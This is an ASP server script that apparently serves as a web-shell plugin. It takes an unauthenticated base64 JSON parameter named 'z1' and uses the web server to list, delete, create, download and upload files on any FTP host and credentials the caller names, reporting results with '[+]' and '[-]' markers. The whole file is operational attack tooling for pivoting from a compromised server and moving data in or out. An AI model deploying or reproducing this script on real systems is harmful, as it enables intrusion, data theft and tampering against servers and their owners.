<%

On Error Resume Next

Response.CharSet = "utf-8"
Response.ContentType = "text/plain"

Function GetJsonValue(json, key)
    Dim re, matches
    Set re = New RegExp
    re.Global = False
    re.IgnoreCase = True
    
    re.Pattern = """" & key & """\s*:\s*""(.*?)"""
    Set matches = re.Execute(json)
    If matches.Count > 0 Then
        GetJsonValue = matches(0).SubMatches(0)
        Exit Function
    End If

    re.Pattern = """" & key & """\s*:\s*([^,\}\\]]+)"
    Set matches = re.Execute(json)
    If matches.Count > 0 Then
        Dim val
        val = Trim(matches(0).SubMatches(0))
        val = Replace(val, """", "")
        GetJsonValue = val
        Exit Function
    End If

    GetJsonValue = ""
End Function

Function Base64Decode(b64)
    Dim dom, el
    Set dom = Server.CreateObject("MSXML2.DOMDocument.6.0")
    Set el = dom.createElement("tmp")
    el.dataType = "bin.base64"
    el.text = b64
    
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write el.nodeTypedValue
    stream.Position = 0
    stream.Type = 2 ' adTypeText
    stream.Charset = "utf-8"
    Base64Decode = stream.ReadText
    stream.Close
    Set stream = Nothing
    Set el = Nothing
    Set dom = Nothing
End Function

Function FtpExecute(ip, port, user, pass, action, remotePath, timeout, content)
    On Error Resume Next
    Dim urlString, http, timeoutMs
    urlString = "ftp://" & user & ":" & pass & "@" & ip & ":" & port & remotePath
    timeoutMs = timeout * 1000
    If timeoutMs <= 0 Then
        timeoutMs = 10000
    End If

    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")
    
    Select Case LCase(action)
        Case "list"
            http.open "GET", urlString, False
            http.setTimeouts timeoutMs, timeoutMs, timeoutMs, timeoutMs
            http.send
            If Err.Number <> 0 Then
                FtpExecute = "[-] Failed to list directory " & remotePath & " -> " & Err.Description
                Exit Function
            End If
            FtpExecute = "[+] SUCCESS_LIST" & vbCrLf & http.responseText

        Case "mkdir"
            http.open "MKCOL", urlString, False
            http.setTimeouts timeoutMs, timeoutMs, timeoutMs, timeoutMs
            http.send
            If Err.Number <> 0 Then
                FtpExecute = "[-] Failed to create directory " & remotePath & " -> " & Err.Description
                Exit Function
            End If
            FtpExecute = "[+] SUCCESS_MKDIR -> Directory was created: " & remotePath

        Case "delete"
            http.open "DELETE", urlString, False
            http.setTimeouts timeoutMs, timeoutMs, timeoutMs, timeoutMs
            http.send
            If Err.Number <> 0 Then
                FtpExecute = "[-] Failed to delete " & remotePath & " -> " & Err.Description
                Exit Function
            End If
            FtpExecute = "[+] SUCCESS_DELETE -> Removed: " & remotePath

        Case "download", "read"
            http.open "GET", urlString, False
            http.setTimeouts timeoutMs, timeoutMs, timeoutMs, timeoutMs
            http.send
            If Err.Number <> 0 Then
                FtpExecute = "[-] Failed to download file " & remotePath & " -> " & Err.Description
                Exit Function
            End If

            Dim stream, dom, el
            Set stream = Server.CreateObject("ADODB.Stream")
            stream.Type = 1
            stream.Open
            stream.Write http.responseBody
            stream.Position = 0

            Set dom = Server.CreateObject("MSXML2.DOMDocument.6.0")
            Set el = dom.createElement("tmp")
            el.dataType = "bin.base64"
            el.nodeTypedValue = stream.Read
            
            FtpExecute = "[+] SUCCESS_DOWNLOAD" & vbCrLf & el.text
            
            stream.Close
            Set stream = Nothing
            Set dom = Nothing
            Set el = Nothing

        Case "upload"
            If content = "" Then
                FtpExecute = "[-] Failed to upload: File content is empty."
                Exit Function
            End If

            Dim domUp, elUp, fileBytes
            Set domUp = Server.CreateObject("MSXML2.DOMDocument.6.0")
            Set elUp = domUp.createElement("tmp")
            elUp.dataType = "bin.base64"
            elUp.text = content
            fileBytes = elUp.nodeTypedValue

            http.open "PUT", urlString, False
            http.setTimeouts timeoutMs, timeoutMs, timeoutMs, timeoutMs
            http.send fileBytes

            If Err.Number <> 0 Then
                FtpExecute = "[-] Failed to upload file " & remotePath & " -> " & Err.Description
                Exit Function
            End If
            FtpExecute = "[+] SUCCESS_UPLOAD -> File uploaded successfully: " & remotePath

        Case Else
            FtpExecute = "[-] Error: unknown action: " & action
    End Select
End Function

Function Main()
    Dim z1
    z1 = Request("z1")
    If z1 = "" Then
        Main = "[-] Missing parameter z1"
        Exit Function
    End If

    Dim szJson
    szJson = Base64Decode(z1)
    If szJson = "" Then
        szJson = z1
    End If

    Dim ip, port, user, pass, action, remotePath, timeout, content
    ip = GetJsonValue(szJson, "ip")
    If ip = "" Then
        ip = "127.0.0.1"
    End If

    port = GetJsonValue(szJson, "port")
    If Not IsNumeric(port) Or port = "" Then
        port = 21
    Else
        port = CInt(port)
    End If

    user = GetJsonValue(szJson, "user")
    pass = GetJsonValue(szJson, "pass")
    action = GetJsonValue(szJson, "action")
    If action = "" Then
        action = "list"
    End If

    remotePath = GetJsonValue(szJson, "path")
    If remotePath = "" Then
        remotePath = "/"
    End If

    timeout = GetJsonValue(szJson, "timeout")
    If Not IsNumeric(timeout) Or timeout = "" Then
        timeout = 10
    Else
        timeout = CInt(timeout)
    End If

    content = GetJsonValue(szJson, "content")
    Main = FtpExecute(ip, port, user, pass, action, remotePath, timeout, content)

    If Err.Number <> 0 Then
        Main = "[-] ERROR: " & Err.Description
        Err.Clear
    End If
End Function

Response.Write Main()

%>